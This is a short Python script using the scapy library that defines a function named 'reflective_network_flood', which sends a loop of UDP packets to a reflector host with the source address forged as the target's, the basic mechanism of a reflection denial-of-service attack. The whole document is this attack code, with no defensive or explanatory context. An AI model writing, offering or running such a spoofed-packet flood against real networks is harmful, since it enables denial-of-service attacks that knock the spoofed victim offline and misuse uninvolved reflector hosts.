from scapy.all import IP, UDP, send

def reflective_network_flood(reflector_ip, target_ip, num_packets):
    for i in range(num_packets):
        packet = IP(src=target_ip, dst=reflector_ip)/UDP(dport=80)
        send(packet)